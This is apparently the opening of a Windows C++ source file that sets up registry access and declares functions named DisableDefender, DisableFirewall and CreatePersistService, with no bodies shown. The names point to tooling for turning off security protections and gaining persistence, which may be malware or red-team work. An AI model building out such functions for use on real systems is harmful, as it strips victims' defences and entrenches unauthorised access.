#ifndef UNICODE
#define UNICODE
#endif 

#include <Windows.h>
#include <map>
#include <iostream>
#include <winreg.h>
#include <winsvc.h>
#include "..\include\logger.hpp"
#include "..\include\header.hpp"
#include "..\include\util.hpp"

HKEY HKLM = HKEY_LOCAL_MACHINE;
LPCSTR dllPath = "";

void DisableDefender();
void DisableFirewall();
int CreatePersistService();